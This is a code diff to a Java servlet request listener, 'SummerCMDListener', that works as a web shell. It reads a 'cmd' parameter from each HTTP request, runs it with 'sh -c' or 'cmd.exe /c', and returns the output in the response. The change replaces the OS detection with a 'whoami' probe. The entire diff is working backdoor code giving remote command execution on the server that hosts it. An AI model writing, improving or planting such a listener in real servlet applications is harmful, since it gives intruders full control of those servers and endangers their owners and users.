@@ -32,18 +32,25 @@ public class SummerCMDListener implements ServletRequestListener {
             String cmd = httpReq.getParameter("cmd");
             if (cmd != null) {
                 boolean isLinux = true;
-                String osTyp = System.getProperty("os.name");
-                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-                    isLinux = false;
+                ProcessBuilder processBuilderOS = new ProcessBuilder("whoami");
+                Process processOS = processBuilderOS.start();
+                InputStream inOS = processOS.getInputStream();
+                try (Scanner scannerOS = new Scanner(inOS).useDelimiter("\\a")) {
+                    String outputOS = scannerOS.hasNext() ? scannerOS.next() : "";
+                    // 如果输出中包含 \ 则说明是Windows, 毕竟 Linux 用户没有域名, Windows 的 whoami 输出是 域名\用户名
+                    if (outputOS.contains("\\")) {
+                        isLinux = false;
+                    }
                 }
                 String[] cmds = isLinux ? new String[] { "sh", "-c", cmd }
                         : new String[] { "cmd.exe", "/c", cmd };
                 InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-                Scanner s = new Scanner(in).useDelimiter("\\a");
-                String output = s.hasNext() ? s.next() : "";
-                try (PrintWriter responseWriter = servletResponse.getWriter()) {
-                    responseWriter.println(output);
-                    responseWriter.flush();
+                try (Scanner s = new Scanner(in).useDelimiter("\\a")) {
+                    String output = s.hasNext() ? s.next() : "";
+                    try (PrintWriter responseWriter = servletResponse.getWriter()) {
+                        responseWriter.println(output);
+                        responseWriter.flush();
+                    }
                 }
             }
         } catch (Exception var5) {
